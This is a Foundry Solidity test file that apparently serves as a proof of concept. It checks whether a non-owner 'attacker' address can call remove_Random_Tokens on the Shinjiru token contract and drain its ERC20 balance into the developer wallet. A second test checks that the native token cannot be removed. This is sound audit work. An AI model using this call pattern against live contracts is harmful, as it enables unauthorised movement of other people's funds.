// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Shinjiru.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    
    constructor(uint256 _supply) {
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ShinjiruTest is Test {
    Shinjiru shinjiru;
    address owner = 0x1ae66a7070BFABc33715A494B4F59aE1E82E3072;
    address attacker = makeAddr("attacker");
    ERC20Mock mockToken;
    
    function setUp() public {
        // Setup mock external UNI calls before deployment
        address fakeFactory = address(1);
        address fakeWETH = address(2);
        address fakePair = address(3);
        
        // Mock Uniswap router calls
        vm.mockCall(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            abi.encodeWithSelector(bytes4(0xc45a0155)), // factory()
            abi.encode(fakeFactory)
        );
        vm.mockCall(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            abi.encodeWithSelector(bytes4(0xad5c4648)), // WETH()
            abi.encode(fakeWETH)
        );
        
        // Mock factory createPair call
        vm.mockCall(
            fakeFactory,
            abi.encodeWithSelector(bytes4(0xc9c65396)), // createPair()
            abi.encode(fakePair)
        );
        
        // Deploy with mocks in place
        vm.prank(owner);
        shinjiru = new Shinjiru();
        
        // Setup target token
        mockToken = new ERC20Mock(1000 ether);
        mockToken.transfer(address(shinjiru), 100 ether);
    }

    // Test that non-owner can call remove_Random_Tokens
    function testNonOwnerTokenRemoval() public {
        // Get developer wallet address once
        address devWallet = shinjiru.Wallet_Dev();

        // 1. Pre-trigger operations: Capture state
        console2.log("--- BEFORE-Trigger Token Balances ---");
        uint256 contractBalanceBefore = mockToken.balanceOf(address(shinjiru));
        uint256 devBalanceBefore = mockToken.balanceOf(devWallet);
        console2.log("Contract token balance (Before): %d", contractBalanceBefore);
        console2.log("Dev wallet token balance (Before): %d", devBalanceBefore);

        // 2. Trigger operation: Non-owner removes tokens
        console2.log("--- Trigger remove_Random_Tokens ---");
        vm.prank(attacker);
        bool result = shinjiru.remove_Random_Tokens(address(mockToken), 100);

        // 3. Post-trigger operations: Capture state
        console2.log("--- AFTER-Trigger Token Balances ---");
        uint256 contractBalanceAfter = mockToken.balanceOf(address(shinjiru));
        uint256 devBalanceAfter = mockToken.balanceOf(devWallet);
        console2.log("Contract token balance (After): %d", contractBalanceAfter);
        console2.log("Dev wallet token balance (After): %d", devBalanceAfter);
        
        // 4. Compare state changes
        bool tokensDrained = contractBalanceAfter == 0;
        bool tokensTransferred = devBalanceAfter == devBalanceBefore + contractBalanceBefore;
        bool vulnerabilityExists = tokensDrained && tokensTransferred;

        console2.log("--- Comparison Verdict ---");
        console2.log("Tokens drained from contract: %s", tokensDrained ? "YES" : "NO");
        console2.log("Tokens transferred to dev: %s", tokensTransferred ? "YES" : "NO");
        
        // Final verdict logic
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Non-owner successfully drained tokens to developer wallet");
        } else {
            console2.log("Vulnerability not Exist: Token balances were not modified as expected");
        }
    }

    // Test reverting when native token is passed
    function testNativeTokenRemovalPrevention() public {
        vm.prank(attacker);
        vm.expectRevert("Can not remove native token");
        shinjiru.remove_Random_Tokens(address(shinjiru), 100);
    }
}